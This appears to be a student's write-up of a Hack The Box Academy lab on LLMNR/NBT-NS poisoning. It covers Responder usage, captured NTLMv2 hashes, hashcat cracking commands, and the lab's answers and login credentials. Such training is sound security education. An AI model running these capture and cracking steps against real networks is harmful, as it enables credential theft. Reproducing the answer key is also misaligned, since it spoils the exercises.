# LLMNR/NBT-NS Poisoning From Linux
This section and the next will cover a common way to gather credentials and gain an initial foothold during an assessment: a Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. 

## LLMNR & NBT-NS Primer
[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. 

LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

### Quick Example - LLMNR/NBT-NS Poisoning

1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:
<table class="bg-neutral-800 text-primary w-full mb-6 rounded-lg"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Tool</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Description</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://github.com/lgandx/Responder" rel="nofollow" target="_blank" class="hover:underline text-green-400">Responder</a></td><td class="p-4">Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://github.com/Kevin-Robertson/Inveigh" rel="nofollow" target="_blank" class="hover:underline text-green-400">Inveigh</a></td><td class="p-4">Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://www.metasploit.com/" rel="nofollow" target="_blank" class="hover:underline text-green-400">Metasploit</a></td><td class="p-4">Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.</td></tr></tbody></table>

Responder is written in Python and typically used on a Linux attack host, though there is a .exe version that works on Windows. Inveigh is written in both C# and PowerShell (considered legacy). Both tools can be used to attack the following protocols:

- LLMNR
- DNS
- MDNS
- NBNS
- DHCP
- ICMP
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Auth

Responder also has support for:

- MSSQL
- DCE-RPC
- FTP, POP3, IMAP, and SMTP auth

## Responder in Action

```sh
masterofblafu@htb[/htb]$ responder -h
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -r -f
or:
responder -I eth0 -wrf

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined with
                        -r. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.
```

> **Note:** Responder logs are stored under /usr/share/responder/logs

Some common options we'll typically want to use are -wf; this will start the WPAD rogue proxy server, while `-f` will attempt to fingerprint the remote host operating system and version. We can use the `-v` flag for increased verbosity if we are running into issues, but this will lead to a lot of additional data printed to the console. Other options such as `-F` and `-P` can be used to force NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly. The use of the `-w` flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) enabled.

Typically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using hash mode `5600` for NTLMv2 hashes that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes and can consult the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page to identify them and find the proper hash mode. If we ever obtain a strange or unknown hash, this site is a great reference to help identify it.

```sh
$ sudo responder -I ens224
```

## Questions
SSH to **10.129.11.144 (ACADEMY-EA-ATTACK01)** with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer. **Answer: backupagent**
   - Start responder to listen on interface ens224:
        ```sh
        $ sudo responder -I ens224
        <SNIP>
        [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
        [SMB] NTLMv2-SSP Client   : 172.16.5.130
        [SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
        [SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:33a22a5a19a349ef:73E8D92D82A5D44B11C60551D30BFEF9:010100000000000080367F1AD4B1DC016B850F93050AE0C90000000002000800340037005200570001001E00570049004E002D00490057004F003500550056003800530032005000370004003400570049004E002D00490057004F00350055005600380053003200500037002E0034003700520057002E004C004F00430041004C000300140034003700520057002E004C004F00430041004C000500140034003700520057002E004C004F00430041004C000700080080367F1AD4B1DC010600040002000000080030003000000000000000000000000030000096B36AA0CDF17E1C8105BD5291B0FACF8C2B1ADA6E359FD9DAC713F3319E25170A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
        <SNIP>
        ```
2. Crack the hash for the previous account and submit the cleartext password as your answer. **Answer: h1backup55**
   - Store the found NTLMv2 hash in `hash.txt`
   - Use hashcat to crack this NTLMv2 hash using the `rockyou` wordlist:
        ```sh
        $ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
        hashcat (v6.2.6) starting

        <SNIP>

        BACKUPAGENT::INLANEFREIGHT:33a22a5a19a349ef:73e8d92d82a5d44b11c60551d30bfef9:010100000000000080367f1ad4b1dc016b850f93050ae0c90000000002000800340037005200570001001e00570049004e002d00490057004f003500550056003800530032005000370004003400570049004e002d00490057004f00350055005600380053003200500037002e0034003700520057002e004c004f00430041004c000300140034003700520057002e004c004f00430041004c000500140034003700520057002e004c004f00430041004c000700080080367f1ad4b1dc010600040002000000080030003000000000000000000000000030000096b36aa0cdf17e1c8105bd5291b0facf8c2b1ada6e359fd9dac713f3319e25170a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
                                                                
        <SNIP>
        ```
3. Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer. **Answer: transporter@4**
   - View responder log at `/usr/share/responder/logs` and look for wley's captured NTLMv2 hash:
        ```sh
        $ cd /usr/share/responder/logs
        $ cat *.txt | grep wley
        <SNIP>
        wley::INLANEFREIGHT:042d04e0adfc984e:A0AE52474435721837B5C87F462E68B6:010100000000000080367F1AD4B1DC01401E1C01F8C103690000000002000800340037005200570001001E00570049004E002D00490057004F003500550056003800530032005000370004003400570049004E002D00490057004F00350055005600380053003200500037002E0034003700520057002E004C004F00430041004C000300140034003700520057002E004C004F00430041004C000500140034003700520057002E004C004F00430041004C000700080080367F1AD4B1DC010600040002000000080030003000000000000000000000000030000096B36AA0CDF17E1C8105BD5291B0FACF8C2B1ADA6E359FD9DAC713F3319E25170A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
        ```
   - Store the found NTLMv2 hash in `hash.txt`
   - Use hashcat to crack this NTLMv2 hash using the `rockyou` wordlist:
        ```sh
        $ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
        hashcat (v6.2.6) starting

        <SNIP>

        WLEY::INLANEFREIGHT:042d04e0adfc984e:a0ae52474435721837b5c87f462e68b6:010100000000000080367f1ad4b1dc01401e1c01f8c103690000000002000800340037005200570001001e00570049004e002d00490057004f003500550056003800530032005000370004003400570049004e002d00490057004f00350055005600380053003200500037002e0034003700520057002e004c004f00430041004c000300140034003700520057002e004c004f00430041004c000500140034003700520057002e004c004f00430041004c000700080080367f1ad4b1dc010600040002000000080030003000000000000000000000000030000096b36aa0cdf17e1c8105bd5291b0facf8c2b1ada6e359fd9dac713f3319e25170a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4

        <SNIP>
        ```